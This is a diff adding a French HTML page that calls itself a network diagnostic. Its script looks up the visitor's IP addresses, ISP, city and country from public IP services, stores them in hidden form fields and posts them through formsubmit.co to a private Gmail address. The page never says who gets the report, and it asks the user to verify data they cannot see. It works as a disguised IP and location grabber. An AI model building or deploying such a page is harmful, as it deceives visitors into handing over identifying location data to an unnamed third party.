@@ -1,0 +1,71 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Diagnostic réseau</title>
+</head>
+<body>
+<h2>Diagnostic réseau</h2>
+<p>Cette page récupère les informations publiques de ta connexion.</p>
+
+<button onclick="getInfo()">Lancer le diagnostic</button>
+<div id="result"></div>
+
+<form id="sendForm"
+action="https://formsubmit.co/itzaimry@gmail.com"
+method="POST">
+
+<input type="hidden" name="_subject" value="Rapport réseau">
+<input type="hidden" name="IPv4" id="ipv4">
+<input type="hidden" name="IPv6" id="ipv6">
+<input type="hidden" name="Fournisseur" id="isp">
+<input type="hidden" name="Ville" id="city">
+<input type="hidden" name="Pays" id="country">
+
+<label>
+<input type="checkbox" id="consent" required>
+J'accepte de transmettre ces informations.
+</label>
+
+<button type="submit">Envoyer le rapport</button>
+</form>
+
+<script>
+async function getInfo() {
+  const result = document.getElementById("result");
+
+  try {
+    const r = await fetch("https://ipwho.is/");
+    const d = await r.json();
+
+    if (!d.success) throw new Error();
+
+    const ipv4 = d.ip.includes(":") ? "Non détectée" : d.ip;
+
+    document.getElementById("ipv4").value = ipv4;
+    document.getElementById("isp").value =
+      d.connection?.isp || "Inconnu";
+    document.getElementById("city").value = d.city || "Inconnue";
+    document.getElementById("country").value = d.country || "Inconnu";
+
+    try {
+      const v6 = await fetch("https://api64.ipify.org?format=json");
+      const data = await v6.json();
+      document.getElementById("ipv6").value =
+        data.ip.includes(":") ? data.ip : "Non disponible";
+    } catch {
+      document.getElementById("ipv6").value = "Non disponible";
+    }
+
+    result.textContent =
+      "Diagnostic terminé. Vérifie les informations avant l'envoi.";
+
+  } catch {
+    result.textContent = "Erreur lors du diagnostic.";
+  }
+}
+</script>
+</body>
+</html>
